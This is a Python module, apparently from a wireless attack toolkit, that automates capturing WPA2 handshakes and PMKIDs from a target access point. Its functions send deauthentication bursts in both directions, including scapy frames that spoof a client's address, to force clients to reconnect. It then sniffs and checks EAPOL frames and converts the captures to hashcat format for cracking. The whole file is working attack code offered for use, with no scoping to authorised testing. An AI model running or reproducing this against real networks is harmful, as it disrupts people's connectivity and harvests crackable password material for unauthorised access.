#!/usr/bin/env python3
# modules/handshake.py — Complete rewrite fixing bugs 1-11
from __future__ import annotations

import glob
import hashlib
import os
import re
import shutil
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from typing import Optional


# ═══════════════════════════════════════════════════════════
# UTILITY
# ═══════════════════════════════════════════════════════════

def _kill(proc: Optional[subprocess.Popen]) -> None:
    """Kill a Popen process silently."""
    if proc is None:
        return
    try:
        proc.kill()
        proc.wait(timeout=3)
    except Exception:
        pass


kill_proc_safe = _kill  # backward-compat alias


def _sha256(path: str) -> str:
    try:
        return hashlib.sha256(Path(path).read_bytes()).hexdigest()
    except Exception:
        return "unknown"



# ═══════════════════════════════════════════════════════════
# STAGE 1 — INJECTION CAPABILITY TEST
# ═══════════════════════════════════════════════════════════

def verify_injection_capability(monitor_interface: str) -> bool:
    """
    Test packet injection with aireplay-ng -9.
    Returns True if injection confirmed, False if not.
    NEVER aborts capture — injection failure is a warning, not a fatal error.
    Some adapters support injection without passing this test.
    """
    try:
        result = subprocess.run(
            ['aireplay-ng', '-9', monitor_interface],
            capture_output=True, text=True, timeout=15
        )
        output = result.stdout + result.stderr
        if 'injection is working' in output.lower():
            return True
        if 'successful' in output.lower():
            return True
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return False


# ═══════════════════════════════════════════════════════════
# STAGE 2 — VERIFIED CHANNEL LOCK (Bug 11 fix)
# ═══════════════════════════════════════════════════════════

def lock_channel_verified(channel: int, monitor_interface: str) -> bool:
    """
    Lock interface to channel with readback verification.
    Tries up to 3 times. Returns True if lock confirmed, False if failed.
    Bug 11 fix: actually verify the channel was set, not just assume success.
    """
    for _ in range(3):
        subprocess.run(
            ['iw', 'dev', monitor_interface, 'set', 'channel', str(channel)],
            capture_output=True
        )
        subprocess.run(
            ['iwconfig', monitor_interface, 'channel', str(channel)],
            capture_output=True
        )
        time.sleep(0.3)  # allow adapter firmware to settle

        result = subprocess.run(
            ['iw', 'dev', monitor_interface, 'info'],
            capture_output=True, text=True
        )
        match = re.search(r'channel\s+(\d+)', result.stdout)
        if match and int(match.group(1)) == channel:
            return True
        time.sleep(0.5)

    return False  # failed all 3 attempts — warn but continue


# ═══════════════════════════════════════════════════════════
# CAP FILE FINDER (Bug 1 fix)
# ═══════════════════════════════════════════════════════════

def _find_cap_file(prefix: str) -> Optional[str]:
    """
    Find the actual .cap file that airodump-ng wrote.
    Bug 1 fix: airodump writes prefix-01.cap, never prefix.cap.
    Returns the most recently modified .cap file, or None.
    """
    pattern = prefix + '-*.cap'
    matches = glob.glob(pattern)
    if not matches:
        return None
    return max(matches, key=os.path.getmtime)


# ═══════════════════════════════════════════════════════════
# ENGINE A — airodump-ng CAPTURE (Bug 2 fix)
# ═══════════════════════════════════════════════════════════

def _launch_airodump(
    bssid: str,
    channel: int,
    monitor_interface: str,
    prefix: str,
) -> subprocess.Popen:
    """
    Launch airodump-ng for handshake capture.
    Bug 2 fix: --write-interval 1 forces disk flush every second.
    NOTE: Do NOT use -a here; -a filters associated clients in CSV but
    for cap capture we want ALL frames from/to the target BSSID, including
    the handshake which happens DURING (re)association.
    """
    cmd = [
        'airodump-ng',
        '--bssid', bssid.upper(),
        '-c', str(channel),
        '--write-interval', '1',      # Bug 2 fix: flush every second
        '--output-format', 'cap',     # only cap, not csv/netxml
        '-w', prefix,
        monitor_interface,
    ]
    return subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


# ═══════════════════════════════════════════════════════════
# ENGINE B — SCAPY EAPOL SNIFFER (Bug 8 fix)
# ═══════════════════════════════════════════════════════════

def _scapy_eapol_sniffer(
    bssid: str,
    monitor_interface: str,
    result_holder: dict,
    stop_event: threading.Event,
) -> None:
    """
    In-memory EAPOL capture via scapy. Runs in a daemon thread.

    Bug 8 fix: Use lfilter (Python-level) NOT BPF filter.
    BPF 'ether proto 0x888e' is unreliable in monitor mode — RadioTap
    encapsulation shifts byte offsets and the filter often matches nothing.
    lfilter with haslayer(EAPOL) is 100% reliable across all drivers.

    Sets result_holder['frames'] when M1+M2 or M2+M3 pair is detected.
    A crackable WPA2 handshake requires M1+M2 (minimum) or M2+M3.
    """
    try:
        from scapy.all import sniff, EAPOL, Dot11  # type: ignore
    except ImportError:
        return

    bssid_upper = bssid.upper()
    eapol_frames: list = []
    message_types_seen: set = set()

    def _get_eapol_msg_num(pkt):
        """Identify EAPOL message number from Key Information field bits."""
        if not pkt.haslayer(EAPOL):
            return None
        try:
            raw = bytes(pkt[EAPOL])
            if len(raw) < 7:
                return None
            # raw[0]=version, raw[1]=type (3=EAPOL-Key), raw[2-3]=length
            eapol_type = raw[1]
            if eapol_type != 3:  # 3 = EAPOL-Key
                return None
            # raw[4]=descriptor type, raw[5-6]=Key Info (16-bit, big-endian)
            key_info = (raw[5] << 8) | raw[6]
            mic_bit     = bool(key_info & 0x0100)
            ack_bit     = bool(key_info & 0x0080)
            install_bit = bool(key_info & 0x0040)
            secure_bit  = bool(key_info & 0x0200)

            if ack_bit and not mic_bit:
                return 1   # M1: ACK=1, MIC=0
            elif not ack_bit and mic_bit and not install_bit and not secure_bit:
                return 2   # M2: ACK=0, MIC=1, Install=0, Secure=0
            elif ack_bit and mic_bit and install_bit:
                return 3   # M3: ACK=1, MIC=1, Install=1
            elif not ack_bit and mic_bit and install_bit:
                return 4   # M4: ACK=0, MIC=1, Install=1
        except Exception:
            pass
        return None

    def _handler(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(EAPOL):
            return

        # Check that this packet is from/to our target AP
        if pkt.haslayer(Dot11):
            pkt_bssid = (pkt[Dot11].addr3 or '').upper()
            if pkt_bssid != bssid_upper:
                return

        msg_num = _get_eapol_msg_num(pkt)
        if msg_num:
            message_types_seen.add(msg_num)
            eapol_frames.append(pkt)

        # Crackable handshake: M1+M2 OR M2+M3
        if ({1, 2}.issubset(message_types_seen) or
                {2, 3}.issubset(message_types_seen)):
            result_holder['frames'] = list(eapol_frames)
            result_holder['messages'] = set(message_types_seen)
            stop_event.set()

    try:
        sniff(
            iface=monitor_interface,
            lfilter=lambda p: p.haslayer(EAPOL),   # Bug 8 fix: lfilter not BPF
            prn=_handler,
            store=False,
            stop_filter=lambda _: stop_event.is_set(),
            timeout=300,
        )
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════
# DEAUTH BURST — bidirectional (Bug 7 fix)
# ═══════════════════════════════════════════════════════════

def _send_deauth_burst(
    bssid: str,
    client_mac: Optional[str],
    monitor_interface: str,
    count: int = 12,
) -> None:
    """
    Send deauth frames in BOTH directions.

    Direction 1 — AP→Client (aireplay-ng, fast):
        aireplay-ng -0 N -a BSSID -c CLIENT --ignore-negative-one IFACE
        If no client: broadcast deauth to FF:FF:FF:FF:FF:FF

    Direction 2 — Client→AP (scapy raw frames, Bug 7 fix):
        Craft Dot11Deauth with addr1=BSSID, addr2=CLIENT, addr3=BSSID.
        Forces AP to drop client from its association table.
        Bug 7 fix: old code swapped -a and -c which sent a mangled frame
        that does nothing. The correct second direction uses scapy.
    """
    # Direction 1: aireplay-ng (AP→Client direction)
    cmd = [
        'aireplay-ng',
        '-0', str(count),
        '-a', bssid.upper(),
        '--ignore-negative-one',
    ]
    if client_mac:
        cmd.extend(['-c', client_mac.upper()])
    cmd.append(monitor_interface)

    try:
        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        # Non-blocking: let it run while we send the scapy direction
    except FileNotFoundError:
        pass

    # Direction 2: scapy Client→AP (only if we have a specific client)
    # Bug 7 fix: this is the correct second direction, not swapping -a/-c
    if client_mac:
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp  # type: ignore
            frame_client_to_ap = (
                RadioTap() /
                Dot11(
                    addr1=bssid.upper(),        # Destination = AP
                    addr2=client_mac.upper(),   # Source = Client (spoofed)
                    addr3=bssid.upper(),        # BSSID
                ) /
                Dot11Deauth(reason=7)           # reason 7 = Class 3 frame received
            )
            sendp(
                frame_client_to_ap,
                iface=monitor_interface,
                count=count,
                inter=0.08,
                verbose=False,
            )
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════
# HANDSHAKE VERIFICATION — triple method (Bug 10 fix)
# ═══════════════════════════════════════════════════════════

def verify_handshake(cap_file: str, bssid: str, ssid: str = '') -> bool:
    """
    Triple-method handshake verification. Returns True if cap_file contains
    a crackable WPA2 handshake for the given BSSID.

    Bug 10 fix: ≥2 EAPOL frames does NOT mean crackable. Must verify
    specific message pairs: M1+M2 OR M2+M3.

    Method 1: aircrack-ng with /dev/null wordlist — most reliable.
    Method 2: tshark Key Info message type detection.
    Method 3: scapy rdpcap fallback.
    """
    if not cap_file or not os.path.exists(cap_file):
        return False
    if os.path.getsize(cap_file) < 200:
        return False

    # Method 1: aircrack-ng with /dev/null wordlist
    # Bug 10 fix: check stdout for "1 handshake", NOT return code (always non-zero)
    try:
        result = subprocess.run(
            ['aircrack-ng', '-a', '2', '-b', bssid.upper(),
             '-w', '/dev/null', cap_file],
            capture_output=True, text=True, timeout=20
        )
        output = result.stdout + result.stderr
        match = re.search(r'(\d+)\s+handshake', output, re.IGNORECASE)
        if match and int(match.group(1)) > 0:
            return True
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    # Method 2: tshark EAPOL Key Info analysis
    try:
        result = subprocess.run(
            [
                'tshark', '-r', cap_file,
                '-Y', f'eapol && wlan.bssid == {bssid.lower()}',
                '-T', 'fields',
                '-e', 'eapol.keydes.key_info',
            ],
            capture_output=True, text=True, timeout=15
        )
        messages_seen: set = set()
        for line in result.stdout.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                key_info = int(line, 16)
            except ValueError:
                try:
                    key_info = int(line)
                except ValueError:
                    continue

            mic_bit     = bool(key_info & 0x0100)
            ack_bit     = bool(key_info & 0x0080)
            install_bit = bool(key_info & 0x0040)
            secure_bit  = bool(key_info & 0x0200)

            if ack_bit and not mic_bit:
                messages_seen.add(1)
            elif not ack_bit and mic_bit and not install_bit and not secure_bit:
                messages_seen.add(2)
            elif ack_bit and mic_bit and install_bit:
                messages_seen.add(3)
            elif not ack_bit and mic_bit and install_bit:
                messages_seen.add(4)

        # Bug 10 fix: need M1+M2 or M2+M3, NOT just any 2 EAPOL frames
        if {1, 2}.issubset(messages_seen) or {2, 3}.issubset(messages_seen):
            return True
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    # Method 3: scapy rdpcap fallback
    try:
        from scapy.all import rdpcap, EAPOL, Dot11  # type: ignore
        packets = rdpcap(cap_file)
        messages_seen = set()
        bssid_upper = bssid.upper()
        for pkt in packets:
            if not pkt.haslayer(EAPOL):
                continue
            if pkt.haslayer(Dot11):
                if (pkt[Dot11].addr3 or '').upper() != bssid_upper:
                    continue
            try:
                raw = bytes(pkt[EAPOL])
                # raw[0]=version, raw[1]=type (3=EAPOL-Key)
                if len(raw) < 7 or raw[1] != 3:
                    continue
                key_info = (raw[5] << 8) | raw[6]
                mic_bit     = bool(key_info & 0x0100)
                ack_bit     = bool(key_info & 0x0080)
                install_bit = bool(key_info & 0x0040)
                secure_bit  = bool(key_info & 0x0200)
                if ack_bit and not mic_bit:
                    messages_seen.add(1)
                elif not ack_bit and mic_bit and not install_bit and not secure_bit:
                    messages_seen.add(2)
                elif ack_bit and mic_bit and install_bit:
                    messages_seen.add(3)
                elif not ack_bit and mic_bit and install_bit:
                    messages_seen.add(4)
            except Exception:
                continue
        if {1, 2}.issubset(messages_seen) or {2, 3}.issubset(messages_seen):
            return True
    except Exception:
        pass

    return False


# ═══════════════════════════════════════════════════════════
# PHASE 3 — hcxdumptool PMKID (Bug 9 fix)
# ═══════════════════════════════════════════════════════════

def _run_hcxdumptool_pmkid(
    bssid: str,
    monitor_interface: str,
    duration: int,
    out_dir: str,
) -> Optional[str]:
    """
    Capture PMKID hash using hcxdumptool.
    Bug 9 fix: Only called AFTER airodump-ng has been terminated.
    Never called in parallel with airodump-ng on the same interface.
    Two tools cannot exclusively control the same interface simultaneously.

    Returns path to .hc22000 file if PMKID captured, None otherwise.
    """
    pcapng_file  = os.path.join(out_dir, 'pmkid.pcapng')
    hc22000_file = os.path.join(out_dir, 'pmkid.hc22000')
    bssid_filter = os.path.join(out_dir, 'bssid_filter.txt')

    with open(bssid_filter, 'w') as f:
        f.write(bssid.lower() + '\n')

    cmd = [
        'hcxdumptool',
        '-i', monitor_interface,
        '-o', pcapng_file,
        '--enable_status=1',
        '--filterlist_ap=' + bssid_filter,
        '--filtermode=2',              # only capture listed BSSIDs
        '--disable_deauthentication',  # passive — no active attacks
    ]

    proc = None
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(duration)
    except FileNotFoundError:
        print("  [!] hcxdumptool not installed — skipping PMKID phase")
        return None
    finally:
        if proc and proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()

    if not os.path.exists(pcapng_file) or os.path.getsize(pcapng_file) < 100:
        return None

    try:
        subprocess.run(
            ['hcxpcapngtool', '-o', hc22000_file, pcapng_file],
            capture_output=True, text=True, timeout=30
        )
        if (os.path.exists(hc22000_file) and
                os.path.getsize(hc22000_file) > 0):
            return hc22000_file
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return None


# ═══════════════════════════════════════════════════════════
# AUTO-CONVERT .cap → .hc22000
# ═══════════════════════════════════════════════════════════

def _convert_to_hc22000(cap_file: str) -> Optional[str]:
    """
    Convert .cap file to hashcat .hc22000 format via hcxpcapngtool.
    Called automatically after a successful handshake capture.
    Returns path to .hc22000 or None if hcxpcapngtool not available.
    """
    hc22000_file = cap_file.replace('.cap', '.hc22000')
    try:
        subprocess.run(
            ['hcxpcapngtool', '-o', hc22000_file, cap_file],
            capture_output=True, text=True, timeout=30
        )
        if os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 0:
            print(f"      hashcat format: {hc22000_file}")
            return hc22000_file
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return None


# ═══════════════════════════════════════════════════════════
# MASTER CAPTURE FUNCTION
# ═══════════════════════════════════════════════════════════

def capture_handshake(
    bssid: str,
    ssid: str,
    channel: int,
    monitor_interface: str,
    timeout: int = 180,
) -> Optional[str]:
    """
    Capture WPA2 handshake for target AP. Returns path to .cap file on
    success, None on failure.

    Pipeline:
      1. Injection capability test (warning only, never aborts)
      2. Verified channel lock (up to 3 retries with readback)
      3. Client discovery (12 s via client_scanner)
      4. Launch airodump-ng (Engine A) + scapy sniffer (Engine B) in parallel
      5. Deauth loop: targeted unicast + bidirectional scapy frames
      6. Phase 3: kill airodump → hcxdumptool PMKID exclusively (Bug 9 fix)
      7. Return verified cap file path or None
    """
    from modules.client_scanner import scan_clients, display_clients

    print(f"\n  [*] Target: {ssid} ({bssid}) on channel {channel}")

    # ── Stage 1: Injection test ──────────────────────────────────────────────
    print("  [*] Testing packet injection capability...")
    injection_ok = verify_injection_capability(monitor_interface)
    if injection_ok:
        print("  [+] Injection: confirmed")
    else:
        print("  [!] Injection test inconclusive — continuing anyway")
        print("      (some adapters inject fine without passing this test)")

    # ── Stage 2: Channel lock ─────────────────────────────────────────────────
    print(f"  [*] Locking to channel {channel}...")
    if not lock_channel_verified(channel, monitor_interface):
        print(f"  [!] WARNING: Channel lock unconfirmed — adapter may drift")
    else:
        print(f"  [+] Channel {channel} confirmed")

    # ── Stage 3: Discover clients ─────────────────────────────────────────────
    print("  [*] Scanning for associated clients (12 s)...")
    clients = scan_clients(
        bssid=bssid,
        channel=channel,
        monitor_interface=monitor_interface,
        duration=12,
    )
    display_clients(clients, bssid)
    target_clients = clients[:3]  # top 3 by signal strength

    # ── Stage 4: Launch capture engines ──────────────────────────────────────
    tmpdir = tempfile.mkdtemp(prefix='wd_cap_')
    cap_prefix = os.path.join(tmpdir, 'handshake')
    airodump_proc: Optional[subprocess.Popen] = None
    stop_event = threading.Event()
    scapy_result: dict = {}

    try:
        # Engine A: airodump-ng
        print("  [*] Starting capture (airodump-ng)...")
        airodump_proc = _launch_airodump(bssid, channel, monitor_interface, cap_prefix)

        # Wait up to 3 s for cap file to appear
        cap_file: Optional[str] = None
        for _ in range(30):
            time.sleep(0.1)
            cap_file = _find_cap_file(cap_prefix)
            if cap_file:
                break
        if not cap_file:
            print("  [!] WARNING: Cap file not yet created (slow adapter?)")

        # Engine B: scapy sniffer (daemon thread)
        scapy_thread = threading.Thread(
            target=_scapy_eapol_sniffer,
            args=(bssid, monitor_interface, scapy_result, stop_event),
            daemon=True,
        )
        scapy_thread.start()
        print("  [+] Engines running. Starting deauth...")

        # ── Stage 5: Deauth loop ──────────────────────────────────────────────
        deadline = time.time() + (timeout * 0.7)  # 70% of timeout for deauth phases
        attempt = 0
        handshake_found = False
        max_attempts = max(5, timeout // 25)

        while time.time() < deadline and attempt < max_attempts and not stop_event.is_set():
            attempt += 1
            print(f"  [*] Deauth attempt {attempt}/{max_attempts}...")

            if target_clients:
                # Phase 1: targeted unicast — top-3 detected clients
                for client in target_clients:
                    if stop_event.is_set():
                        break
                    print(f"      → Deauth {client.mac} ({client.signal_display})")
                    _send_deauth_burst(
                        bssid=bssid,
                        client_mac=client.mac,
                        monitor_interface=monitor_interface,
                        count=12,
                    )
                    # Poll for handshake during reconnect window
                    for _ in range(50):  # 5-second window, checking every 0.1s
                        time.sleep(0.1)
                        if stop_event.is_set():
                            break
                        cap_file = _find_cap_file(cap_prefix)
                        if cap_file and verify_handshake(cap_file, bssid, ssid):
                            handshake_found = True
                            stop_event.set()
                            break
            else:
                # Phase 2: broadcast deauth (no specific client)
                print("      → Broadcast deauth (no clients found)")
                _send_deauth_burst(
                    bssid=bssid,
                    client_mac=None,
                    monitor_interface=monitor_interface,
                    count=20,
                )
                time.sleep(8)

            # Check cap file after each round
            cap_file = _find_cap_file(cap_prefix)
            if cap_file and verify_handshake(cap_file, bssid, ssid):
                handshake_found = True
                stop_event.set()
                break

            # Check scapy in-memory result
            if scapy_result.get('frames'):
                print("  [+] Scapy sniffer captured EAPOL frames!")
                try:
                    from scapy.all import wrpcap  # type: ignore
                    scapy_cap = cap_prefix + '-scapy.cap'
                    wrpcap(scapy_cap, scapy_result['frames'])
                    if verify_handshake(scapy_cap, bssid, ssid):
                        handshake_found = True
                        cap_file = scapy_cap
                        stop_event.set()
                        break
                except Exception:
                    pass

            if not stop_event.is_set():
                time.sleep(3)

        # ── Stage 6: Phase 3 — hcxdumptool PMKID ────────────────────────────
        if not handshake_found:
            print("  [*] Phase 3: PMKID capture (hcxdumptool, 90 s)...")

            # Bug 9 fix: Kill airodump FIRST to release the interface exclusively
            if airodump_proc and airodump_proc.poll() is None:
                airodump_proc.terminate()
                try:
                    airodump_proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    airodump_proc.kill()
                airodump_proc = None
                time.sleep(1.0)  # let interface settle

            pmkid_result = _run_hcxdumptool_pmkid(
                bssid=bssid,
                monitor_interface=monitor_interface,
                duration=90,
                out_dir=tmpdir,
            )
            if pmkid_result:
                print(f"  [+] PMKID hash captured: {pmkid_result}")
                os.makedirs('results', exist_ok=True)
                final_pmkid = os.path.join(
                    'results',
                    f'pmkid_{bssid.replace(":", "")}.hc22000'
                )
                shutil.copy2(pmkid_result, final_pmkid)
                return final_pmkid

        # ── Stage 7: Final result ─────────────────────────────────────────────
        stop_event.set()

        if handshake_found and cap_file and os.path.exists(cap_file):
            os.makedirs('results', exist_ok=True)
            final_cap = os.path.join(
                'results',
                f'handshake_{bssid.replace(":", "")}_{int(time.time())}.cap'
            )
            shutil.copy2(cap_file, final_cap)

            print(f"\n  [+] Handshake captured: {final_cap}")
            print(f"      SHA-256: {_sha256(final_cap)}")

            _convert_to_hc22000(final_cap)
            return final_cap

        print("  [-] No handshake captured.")
        return None

    finally:
        stop_event.set()
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            try:
                airodump_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                airodump_proc.kill()
        shutil.rmtree(tmpdir, ignore_errors=True)
